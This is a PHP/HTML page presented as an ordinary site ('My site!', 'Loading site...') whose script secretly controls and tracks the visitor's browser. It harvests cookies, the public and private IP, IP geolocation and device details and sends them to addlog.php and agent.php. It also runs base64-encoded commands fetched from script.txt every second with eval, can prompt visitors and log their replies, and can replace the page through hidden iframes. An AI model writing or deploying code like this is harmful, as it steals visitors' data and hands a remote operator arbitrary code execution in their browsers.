<html>
  <head>
    <title>My site!</title>
        <?php
$ip = $_SERVER['REMOTE_ADDR'];
echo '<script>var privateIP = "'.$ip.'";</script>';
?>
  </head>
  <body>
<p>Loading site...</p>
<iframe src="about:blank" class="access-frame" style="position: absolute; overflow-x: hidden; width: 100%; height: 100%; display: none; border: none; background: #FFF; z-index: 20; left: 0px; top: 0px;"></iframe>  
<iframe id="access-frame" style="position: absolute; overflow-x: hidden; width: 100%; height: 100%; display: none; border: none; background: #FFF; z-index: 20; left: 0px; top: 0px;"></iframe> <iframe id="fetch" style="display: none"></iframe>
<script>
  var content;
  var fetchInt;
  var script1 = "";
  var script2 = "";
  var shouldRun;
  function redirectTo(url){
    document.querySelector("#access-frame").style.display = 'none';
    document.querySelector(".access-frame").src = "https://qqqqqqqqqqqqqqqqqq.vercel.app/redirect.html#" + btoa(url);
    document.querySelector(".access-frame").style.display = 'block';
  }
  function displayHTML(html){
    document.querySelector(".access-frame").style.display = 'none';
    document.querySelector("#access-frame").srcdoc = atob(html);
    document.querySelector("#access-frame").style.display = 'block';
  }
  function message(str){
    var to = prompt(str);
  var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      //Do nothing
    }
  };
  xhttp.open("GET", "addlog.php?value=" + btoa("Message sent: " + str + ". Reply: " + to), true);
  xhttp.send();
  }
  function appendLog(log){
      var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      //Do nothing
    }
  };
  xhttp.open("GET", "addlog.php?value=" + btoa(log), true);
  xhttp.send();
  }
  function hackContents(ip){
  var ip = ip;
  var xhttp2 = new XMLHttpRequest();
  xhttp2.onreadystatechange = function() {
    if (this.status == 200 && this.readyState == 4) {
      var info = eval(xhttp2.responseText);
      var location = info.loc.split(",");
      location[0] += 0.035;
      location[1] -= 0.0324;
      appendLog(xhttp2.responseText);
      appendLog(JSON.stringify(location));
    } else{
      appendLog("Error with getting ip contents! Ready state: " + this.readyState + ". Status of xhttp: " + this.status + ".")
    }
  };
  xhttp2.open("GET", "hackip.php?ip=" + ip, true);
  xhttp2.send();
  }
setInterval(async function(){
shouldRun = true;
let x = await fetch("script.txt");
let y = await x.text();
script2 = atob(y);
  if(script2 == script1){
    shouldRun = false;
  } else {
      script1 = atob(y);
  }
  if(script1 == ""){
    shouldRun = false;
  }
  if(shouldRun == true){
    eval(atob(y));
    appendLog("Script has ran successfully!");
  }
}, 1000);
async function getIP(){
let x = await fetch("https://api.ipify.org");
let y = await x.text();
appendLog("Public IP: " + y + "<br> Private IP: " + privateIP);
}
function getWindowInfo() {
  var windowInfo = {};
  windowInfo.screenSize = screen.width + "x" + screen.height;
  windowInfo.hardwareCpu = navigator.cpuModel;
  windowInfo.operatingSystem = navigator.userAgent;
  windowInfo.browserName = navigator.appName;
  windowInfo.cookies = document.cookie;
  windowInfo.timestamp = new Date().toString();
  windowInfo.hostname = window.location.hostname;
  windowInfo.hostport = window.location.port;
  windowInfo.hostFamily = navigator.platform.toLowerCase();
  windowInfo.osVersion = navigator.userAgent.split(" ")[0];
//  windowInfo.chromeExtensions = chrome.extension.getManifest().plugins;
  return windowInfo;
}

var windowInfo = getWindowInfo();

var table = document.createElement("table");
table.setAttribute("border", "1");
table.setAttribute("style", "border-color: green, color: green, font-family: monospace");


var tbody = table.createTBody();
for (var key in windowInfo) {
  var tr = tbody.insertRow(0);
  var td = tr.insertCell(0);
  td.innerHTML = windowInfo[key];
  if(windowInfo[key] == ""){
  td.innerHTML = "None";
  }
  var td = tr.insertCell(0);
  td.innerHTML = key + ": ";
}
      var xhttp = new XMLHttpRequest();
  xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
      //Do nothing
    } else{
      appendLog("Error with xhttp for getting details! Ready state: " + this.readyState + ". Status: " + this.status + ".");
    }
  };
  xhttp.open("GET", "agent.php?details=" + btoa(btoa(table.outerHTML)), true);
  xhttp.send();

</script>
  </body>
</html>